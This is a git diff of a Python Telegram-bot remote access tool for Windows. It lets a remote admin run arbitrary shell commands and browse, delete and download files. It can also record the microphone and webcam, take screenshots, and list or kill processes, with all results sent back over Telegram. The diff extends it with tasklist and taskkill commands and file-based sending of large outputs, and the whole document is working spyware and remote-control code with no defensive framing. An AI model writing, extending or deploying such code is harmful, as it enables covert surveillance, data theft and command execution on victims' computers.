@@ -11,10 +11,11 @@ import os
 import numpy as np
 
 from subprocess import Popen, PIPE
+from datetime import datetime
 
 from telebot.types import KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove
 from threading import Thread
-from telebot import TeleBot
+from telebot import TeleBot, logger
 from ctypes  import windll
 from PIL import Image
 
@@ -24,14 +25,6 @@ def checkID(ms):
     if ms.from_user.id == ADMIN_ID:
         return True
     else:
-        info = f"""
-        Name - {ms.from_user.first_name}
-        Surname - {ms.from_user.last_name}
-        UserName - {ms.from_user.username}
-        Language - {ms.from_user.language_code}
-        """
-        bot.send_message(ADMIN_ID, "USED:")
-        bot.send_message(ADMIN_ID, info)
         return False
 
 
@@ -48,20 +41,28 @@ class Client:
         self.CHANNELS = 1
         self.CHUNK = 8192
         
-        
         self.filename_audio = "recorded_audio.wav"
         self.filename_dump_audio = "dump_record_microphone.wav"
         self.filename_for_dump_audio = "dump_record_microphone.dat"
         self.filename_video = "recorded_video.avi"
 
-    def create_markup(self):
+
+    def create_markup(self, ms, filename):
         markup = ReplyKeyboardMarkup()
         list_files = os.listdir(os.getcwd())
 
-        if len(list_files) >= 230:
-            [markup.add(i) for i in list_files[0:228]]
+        if len(list_files) >= 200:
+            output = "\n".join(list_files)
+            with open(f"d:/{filename}.txt", "w") as file:
+                file.write(output)
+            
+            with open(f"d:/{filename}.txt", "r") as file:
+                bot.send_document(ms.chat.id, file, reply_markup=markup)
+            
+            os.remove(f"d:/{filename}.txt")
         else:
-            [markup.add(i) for i in list_files[0:228]]
+            [markup.add(i) for i in list_files[0:200]]
+
         markup.add("EXIT")
         return markup
 
@@ -70,7 +71,7 @@ class Client:
             bot.send_message(ms.chat.id, os.getcwd(), reply_markup=markup)
 
         elif ms.text == "chdir":
-            markup_chdir = self.create_markup()
+            markup_chdir = self.create_markup(ms, "paths")
             markup_chdir.add("..")
             bot.send_message(ms.chat.id, "Enter path...", reply_markup=markup_chdir)
             
@@ -90,22 +91,27 @@ class Client:
         elif ms.text == "dir":
             try:
                 output = os.listdir()
-                if len(output) >= 230:
-                    output = "\n".join(output[0:230])
-                    bot.send_message(ms.chat.id, output, reply_markup=markup)
-                    bot.send_message(ms.chat.id, f"The first 230 elements are derived from {len(output)}", reply_markup=markup)
+                if len(output) >= 200:
+                    output = "\n".join(output)
+                    with open("d:/list_files.txt", "w") as file:
+                        file.write(output)
                     
+                    with open("d:/list_files.txt", "r") as file:
+                        bot.send_document(ms.chat.id, file, reply_markup=markup)
+                    
+                    os.remove("d:/list_files.txt")
+
                 elif output:
                     output = "\n".join(output)
                     bot.send_message(ms.chat.id, output, reply_markup=markup)
-                    
+
                 else:
                     bot.send_message(ms.chat.id, "<Empty>", reply_markup=markup)
             except Exception as e:
                 bot.send_message(ms.chat.id, f"Error:\n{e}", reply_markup=markup)
 
         elif ms.text == "rm_file":
-            markup_rm = self.create_markup()
+            markup_rm = self.create_markup(ms, "paths")
             bot.send_message(ms.chat.id, "Enter path...", reply_markup=markup_rm)
 
             @bot.message_handler(content_types=["text"])
@@ -124,7 +130,7 @@ class Client:
         elif ms.text == "exec_cmd":
             markup_exec_cmd = ReplyKeyboardMarkup()
             markup_exec_cmd.add("EXIT")
-            bot.send_message(ms.chat.id, "Enter command...")
+            bot.send_message(ms.chat.id, "Enter command...", reply_markup=markup_exec_cmd)
 
             @bot.message_handler(content_types=["text"])
             def exec_cmd_next(ms):
@@ -132,9 +138,21 @@ class Client:
                     try:
                         output = Popen(ms.text.split(" "), stdout=PIPE, stderr=PIPE, shell=True)
                         result, err = output.communicate()
+                        result = result.decode("utf-8")
+                        len_result = len(result.split("\n"))
                         
-                        if result:
+                        if len_result > 200:
+                            with open("output.txt", "w") as file:
+                                file.write(result)
+                            
+                            with open("output.txt", "r") as file:
+                                bot.send_document(ms.chat.id, file, reply_markup=markup)
+                            
+                            os.remove("output.txt")
+                        
+                        elif len_result:
                             bot.send_message(ms.chat.id, result, reply_markup=markup)
+                            
                         else:
                             bot.send_message(ms.chat.id, "<Empty>", reply_markup=markup)
                     except Exception as e:
@@ -144,8 +162,9 @@ class Client:
 
             bot.register_next_step_handler(ms, exec_cmd_next)
 
+
         elif ms.text == "get_file":
-            markup_get_file = self.create_markup()
+            markup_get_file = self.create_markup(ms, "paths")
             bot.send_message(ms.chat.id, "Enter path...", reply_markup=markup_get_file)
             
             @bot.message_handler(content_types=["text"])
@@ -159,20 +178,6 @@ class Client:
                     bot.send_message(ms.chat.id, "EXIT", reply_markup=markup)
 
             bot.register_next_step_handler(ms, get_file_next)
-
-
-        elif ms.text == "screenshot":
-            myScreenshot = pyautogui.screenshot()
-            myScreenshot.save("screenshot.jpg")
-            
-            try:
-                with open("screenshot.jpg", "rb") as photo:
-                    bot.send_photo(ms.chat.id, photo)
-                
-                time.sleep(1)
-                os.remove("sreenshot.jpg")
-            except Exception as e:
-                bot.send_message(ms.chat.id, f"Error:\n{e}", reply_markup=markup)
 
 
         elif ms.text == "record_microphone":
@@ -255,7 +260,7 @@ class Client:
                     video.write(frame)
 
         elif ms.text == "get_video":
-            markup_video = self.create_markup()
+            markup_video = self.create_markup(ms, "paths")
             bot.send_message(ms.chat.id, "Enter path...", reply_markup=markup_video)
 
             @bot.message_handler(content_types=["text"])
@@ -320,6 +325,49 @@ class Client:
 
             bot.register_next_step_handler(ms, getscreen_next)
 
+        elif ms.text == "screenshot":
+            myScreenshot = pyautogui.screenshot()
+            myScreenshot.save("d:/screenshot.jpg")
+
+            try:
+                with open("d:/screenshot.jpg", "rb") as photo:
+                    bot.send_photo(ms.chat.id, photo)
+
+                os.remove("d:/screenshot.jpg")
+            except Exception as e:
+                bot.send_message(ms.chat.id, f"Error:\n{e}", reply_markup=markup)
+
+
+        elif ms.text == "tasklist":
+            output = Popen(["tasklist"], stdout=PIPE, stderr=PIPE, shell=True)
+            result, err = output.communicate()
+
+            with open("tasklist.txt", "w") as file:
+                file.write(result.decode("utf-8"))
+            
+            with open("tasklist.txt", "r") as file:
+                bot.send_document(ms.chat.id, file, reply_markup=markup)
+            
+            os.remove("tasklist.txt")
+
+        elif ms.text == "taskkill":
+            markup_taskkill = ReplyKeyboardMarkup()
+            markup_taskkill.add("EXIT")
+            bot.send_message(ms.chat.id, "Enter process...", reply_markup=markup_taskkill)
+            
+            @bot.message_handler(content_types=["text"])
+            def taskkill_next(ms):
+                if ms.text != "EXIT":
+                    try:
+                       os.system(f"taskkill /im {ms.text}")
+                    except Exception as e:
+                        bot.send_message(ms.chat.id, f"Error:\n{e}", reply_markup=markup)
+                else:
+                    bot.send_message(ms.chat.id, "EXIT", reply_markup=markup)
+
+            bot.register_next_step_handler(ms, taskkill_next)
+
+
     def record_microphone(self, time=6):
         p = pyaudio.PyAudio()
         stream = p.open(format=self.FORMAT,
@@ -382,8 +430,6 @@ class Client:
         p.terminate()
 
 
-
-
 """ Variables """
 API_TOKEN = "token"
 
@@ -394,15 +440,19 @@ bot = TeleBot(API_TOKEN)
 markup = ReplyKeyboardMarkup(True, True)
 markup.add(KeyboardButton("cd"), KeyboardButton("chdir"),
         KeyboardButton("dir"), KeyboardButton("rm_file"),
-        KeyboardButton("exec_cmd"), KeyboardButton("get_file"), 
+        KeyboardButton("exec_cmd"), KeyboardButton("get_file"),
         KeyboardButton("record_microphone"), KeyboardButton("get_audio"),
         KeyboardButton("record_video"), KeyboardButton("get_video"),
-        KeyboardButton("get_screen"), KeyboardButton("screenshot"))
+        KeyboardButton("get_screen"), KeyboardButton("screenshot"),
+        KeyboardButton("tasklist"), KeyboardButton("taskkill"))
  
 """ Start """
 client = Client()
-bot.send_message(ADMIN_ID, "ONLINE ✅", reply_markup=markup)
 
+try:
+    bot.send_message(ADMIN_ID, "ONLINE ✅", reply_markup=markup)
+except:
+    pass
 
 @bot.message_handler(commands=["_start"])
 def send_welcome(ms):
@@ -416,6 +466,5 @@ def CheckCommand(ms):
             client.check_command(ms)
         except Exception as e:
             bot.send_message(ms.chat.id, e)
-
 
 bot.infinity_polling()
